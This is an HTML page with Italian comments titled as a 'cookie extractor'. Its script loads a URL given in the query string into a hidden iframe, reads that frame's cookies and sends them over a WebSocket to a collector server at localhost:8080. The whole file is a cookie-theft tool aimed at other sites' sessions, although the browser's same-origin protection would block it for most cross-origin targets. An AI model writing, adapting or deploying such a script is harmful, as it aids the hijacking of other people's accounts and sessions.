<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Estrattore di Cookie</title>
</head>
<body>
    <h1>Estrattore di Cookie</h1>
    <script>
        // Funzione per ottenere i parametri di query
        function getQueryParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                url: params.get('url')
            };
        }

        // Funzione per inviare i cookie tramite WebSocket
        function sendCookiesViaWebSocket(cookies) {
            const ws = new WebSocket('ws://localhost:8080');

            ws.onopen = () => {
                console.log('WebSocket connection opened');
                ws.send(cookies);
            };

            ws.onmessage = (event) => {
                console.log('Message from server:', event.data);
            };

            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };

            ws.onclose = () => {
                console.log('WebSocket connection closed');
            };
        }

        // Funzione per ottenere i cookie di un dominio specifico
        function getDomainCookies(domain) {
            return new Promise((resolve, reject) => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = domain;
                document.body.appendChild(iframe);

                iframe.onload = () => {
                    try {
                        const cookies = iframe.contentWindow.document.cookie;
                        resolve(cookies);
                    } catch (error) {
                        reject(error);
                    } finally {
                        document.body.removeChild(iframe);
                    }
                };

                iframe.onerror = (error) => {
                    reject(error);
                    document.body.removeChild(iframe);
                };
            });
        }

        // Ottieni i parametri di query
        const queryParams = getQueryParams();
        const url = queryParams.url;

        if (!url) {
            alert('URL mancante nel parametro di query.');
        } else {
            getDomainCookies(url)
                .then(cookies => {
                    alert('Cookies: ' + cookies);
                    console.log('Cookies:', cookies);
                    sendCookiesViaWebSocket(cookies);
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error fetching cookies: ' + error);
                });
        }
    </script>
</body>
</html>
